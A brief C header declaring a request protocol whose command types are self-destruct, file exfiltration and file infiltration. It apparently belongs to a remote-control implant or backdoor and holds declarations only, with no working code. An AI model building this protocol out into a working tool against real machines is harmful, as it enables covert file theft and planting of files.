#ifndef REQ_H
#define REQ_H

#include <stdio.h>

#define REQUEST_HEADER_SIZE 16

typedef struct req_operations req_operations;
typedef struct req req;
typedef enum req_type req_type;

enum req_type
{
    SUICIDE = 0,
    EXF_FILE = 1,
    INF_FILE = 2,
};

struct req_operations
{
    char *(*serialize)(req *this);
    size_t (*get_size)(req *this);
};

struct req
{
    req_type type;
    req_operations req_ops;
};

void req__init(req *this, req_type type);

size_t req__get_total_size(req *this);

char *req__serialize(req *this);
size_t req__get_size(req *this);

req *deserialize_req(char *buffer);
req *read_req(int fd);

#endif
